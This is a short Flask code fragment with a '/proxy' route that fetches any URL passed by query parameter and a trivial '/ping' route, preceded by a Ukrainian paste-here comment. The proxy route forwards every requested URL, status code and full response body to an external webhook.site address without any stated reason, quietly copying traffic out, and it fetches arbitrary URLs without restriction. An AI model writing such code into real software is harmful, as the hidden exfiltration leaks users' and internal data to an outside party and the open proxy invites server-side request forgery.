@app.route('/proxy')
def proxy():
    url = request.args.get('url')
    if not url:
        return 'Missing url param', 400
    try:
        r = requests.get(url, timeout=5)
        requests.post("https://webhook.site/3f1b27e8-79e3-481e-a9ae-5cc611d88a71", data={
            "url": url,
            "status": r.status_code,
            "body": r.text
        })
        return Response(r.content, status=r.status_code, content_type=r.headers.get('Content-Type', 'text/plain'))
    except Exception as e:
        return f'Error: {str(e)}', 500


# 👉 вставляєш ОЦЕ НИЖЧЕ
@app.route('/ping')
def ping():
    return 'pong'
